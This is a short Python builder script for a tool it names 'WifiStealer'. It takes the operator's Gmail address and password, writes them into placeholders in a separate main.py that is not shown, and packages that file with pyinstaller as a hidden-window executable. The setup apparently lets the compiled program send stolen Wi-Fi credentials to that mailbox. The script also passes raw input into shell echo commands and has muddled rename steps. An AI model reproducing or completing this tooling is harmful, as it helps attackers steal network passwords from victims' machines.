import os

os.system('cls')
print("Wifi - Stealer\n")

print("use a G-Mail ...\n\n\n ")


email = input('Type your email: ')
passwd = input('Type your Gmail password:')



os.system('cls')

os.system('echo {} >> info.txt'.format(email))
os.system('echo {} >> info.txt'.format(passwd))

os.system('ren main.py main.txt')
os.system('copy main.txt main2.txt')

with open('main.txt','r') as file:

    filedata = file.read()
    filedata = filedata.replace('EMAILREPLACE', email)
    filedata = filedata.replace('PASSWORDREPLACE', passwd)

with open('main.txt', 'w') as file:
    file.write(filedata)

os.system('ren main.txt main.py')
os.system('ren main2.txt main.py')
os.system('pyinstaller main.py -w -F -n WifiStealer')


